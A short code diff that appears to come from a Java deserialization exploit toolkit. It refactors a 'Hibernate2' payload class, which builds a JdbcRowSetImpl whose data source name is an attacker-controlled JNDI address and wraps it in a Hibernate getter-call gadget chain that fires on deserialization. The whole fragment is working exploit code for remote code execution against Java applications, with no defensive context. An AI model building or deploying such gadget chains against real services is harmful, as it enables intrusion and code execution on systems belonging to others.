@@ -43,15 +43,10 @@ public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies{
         return Hibernate1.getDependencies();
     }
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
         rs.setDataSourceName(command);
-        return (byte[]) Hibernate1.makeCaller(rs, Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData"));
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return Hibernate1.makeCaller(rs, Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData"));
     }
 }
